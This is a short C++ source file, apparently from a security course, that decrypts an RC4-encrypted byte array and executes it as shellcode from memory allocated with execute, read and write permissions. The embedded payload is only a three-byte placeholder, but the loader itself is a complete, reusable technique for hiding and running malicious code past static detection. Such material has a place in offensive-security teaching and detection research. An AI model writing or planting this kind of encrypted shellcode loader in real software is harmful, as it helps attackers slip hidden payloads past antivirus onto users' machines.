// Filename: rc4_shellcode.cpp
// Purpose: Use RC4 to encrypt/decrypt payload and execute it.
// Instructor: Joas A Santos - https://www.linkedin.com/in/joas-antonio-dos-santos - https://github.com/CyberSecurityUP

#include <windows.h>
#include <vector>
#include <iostream>

void rc4(BYTE* data, size_t len, const BYTE* key, size_t keyLen) {
    BYTE S[256];
    for (int i = 0; i < 256; i++) S[i] = i;

    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keyLen]) % 256;
        std::swap(S[i], S[j]);
    }

    int i = 0; j = 0;
    for (size_t k = 0; k < len; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        std::swap(S[i], S[j]);
        data[k] ^= S[(S[i] + S[j]) % 256];
    }
}

int main() {
    BYTE key[] = { 'k','e','y' };
    BYTE encrypted[] = { 0xEB, 0xAD, 0xD4 }; // Encrypted using RC4 with same key
    size_t size = sizeof(encrypted);

    rc4(encrypted, size, key, sizeof(key));

    void* mem = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, encrypted, size);
    ((void(*)())mem)();

    return 0;
}
